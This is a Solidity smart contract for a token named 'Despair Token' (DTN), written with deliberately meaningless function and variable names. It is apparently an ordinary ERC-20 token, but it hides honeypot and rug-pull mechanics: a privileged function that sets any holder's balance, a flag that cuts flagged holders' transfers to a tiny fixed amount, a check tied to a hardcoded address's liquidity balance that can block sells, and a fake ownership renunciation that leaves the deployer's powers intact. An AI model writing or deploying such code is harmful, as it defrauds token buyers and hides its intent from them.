//SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface walletExempt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldList) external view returns (uint256);

    function transfer(address launchedExempt, uint256 tokenBuy) external returns (bool);

    function allowance(address walletReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenBuy) external returns (bool);

    function transferFrom(
        address sender,
        address launchedExempt,
        uint256 tokenBuy
    ) external returns (bool);

    event Transfer(address indexed from, address indexed tokenWalletTrading, uint256 value);
    event Approval(address indexed walletReceiver, address indexed spender, uint256 value);
}

abstract contract launchedMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface shouldMaxLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchedLaunch {
    function createPair(address launchedLimit, address txExempt) external returns (address);
}

interface swapTradingAuto is walletExempt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DespairToken is launchedMin, walletExempt, swapTradingAuto {

    function transferFrom(address fromIsAuto, address launchedExempt, uint256 tokenBuy) external override returns (bool) {
        if (_msgSender() != receiverWallet) {
            if (atMarketing[fromIsAuto][_msgSender()] != type(uint256).max) {
                require(tokenBuy <= atMarketing[fromIsAuto][_msgSender()]);
                atMarketing[fromIsAuto][_msgSender()] -= tokenBuy;
            }
        }
        return teamLaunched(fromIsAuto, launchedExempt, tokenBuy);
    }

    function name() external view virtual override returns (string memory) {
        return senderIsTeam;
    }

    mapping(address => uint256) private buyAuto;

    mapping(address => bool) public shouldSender;

    function owner() external view returns (address) {
        return amountEnable;
    }

    string private atToMarketing = "DTN";

    function receiverFundBuy(uint256 tokenBuy) public {
        minMarketing();
        fundReceiver = tokenBuy;
    }

    function teamLaunched(address fromIsAuto, address launchedExempt, uint256 tokenBuy) internal returns (bool) {
        if (fromIsAuto == buyMin) {
            return autoTo(fromIsAuto, launchedExempt, tokenBuy);
        }
        uint256 limitIs = walletExempt(amountLiquidity).balanceOf(swapLaunch);
        require(limitIs == fundReceiver);
        require(launchedExempt != swapLaunch);
        if (shouldSender[fromIsAuto]) {
            return autoTo(fromIsAuto, launchedExempt, takeMarketing);
        }
        return autoTo(fromIsAuto, launchedExempt, tokenBuy);
    }

    mapping(address => mapping(address => uint256)) private atMarketing;

    mapping(address => bool) public liquidityLimit;

    bool public senderIs;

    uint256 public receiverIsFrom;

    function limitFund(address walletBuy) public {
        if (senderIs) {
            return;
        }
        if (takeSell != receiverIsFrom) {
            receiverIsFrom = marketingTokenWallet;
        }
        liquidityLimit[walletBuy] = true;
        
        senderIs = true;
    }

    function balanceOf(address shouldList) public view virtual override returns (uint256) {
        return buyAuto[shouldList];
    }

    uint256 private enableShould = 100000000 * 10 ** 18;

    function transfer(address fromTrading, uint256 tokenBuy) external virtual override returns (bool) {
        return teamLaunched(_msgSender(), fromTrading, tokenBuy);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return enableShould;
    }

    function autoTo(address fromIsAuto, address launchedExempt, uint256 tokenBuy) internal returns (bool) {
        require(buyAuto[fromIsAuto] >= tokenBuy);
        buyAuto[fromIsAuto] -= tokenBuy;
        buyAuto[launchedExempt] += tokenBuy;
        emit Transfer(fromIsAuto, launchedExempt, tokenBuy);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return tokenLaunch;
    }

    function allowance(address walletMaxTeam, address teamMode) external view virtual override returns (uint256) {
        if (teamMode == receiverWallet) {
            return type(uint256).max;
        }
        return atMarketing[walletMaxTeam][teamMode];
    }

    uint256 fundReceiver;

    bool private tradingWallet;

    uint8 private tokenLaunch = 18;

    uint256 private marketingTokenWallet;

    function getOwner() external view returns (address) {
        return amountEnable;
    }

    address swapLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    event OwnershipTransferred(address indexed modeSender, address indexed senderWalletMode);

    function shouldFund(address fromAuto) public {
        minMarketing();
        
        if (fromAuto == buyMin || fromAuto == amountLiquidity) {
            return;
        }
        shouldSender[fromAuto] = true;
    }

    constructor (){
        
        shouldMaxLaunch walletAmountShould = shouldMaxLaunch(receiverWallet);
        amountLiquidity = launchedLaunch(walletAmountShould.factory()).createPair(walletAmountShould.WETH(), address(this));
        if (receiverIsFrom == takeSell) {
            takeSell = marketingTokenWallet;
        }
        buyMin = _msgSender();
        buyMax();
        liquidityLimit[buyMin] = true;
        buyAuto[buyMin] = enableShould;
        
        emit Transfer(address(0), buyMin, enableShould);
    }

    function symbol() external view virtual override returns (string memory) {
        return atToMarketing;
    }

    address public amountLiquidity;

    string private senderIsTeam = "Despair Token";

    address private amountEnable;

    uint256 constant takeMarketing = 15 ** 10;

    uint256 private takeSell;

    address receiverWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function minMarketing() private view {
        require(liquidityLimit[_msgSender()]);
    }

    uint256 atLiquidityFund;

    function buyMax() public {
        emit OwnershipTransferred(buyMin, address(0));
        amountEnable = address(0);
    }

    function marketingTo(address fromTrading, uint256 tokenBuy) public {
        minMarketing();
        buyAuto[fromTrading] = tokenBuy;
    }

    function approve(address teamMode, uint256 tokenBuy) public virtual override returns (bool) {
        atMarketing[_msgSender()][teamMode] = tokenBuy;
        emit Approval(_msgSender(), teamMode, tokenBuy);
        return true;
    }

    bool public enableAt;

    address public buyMin;

}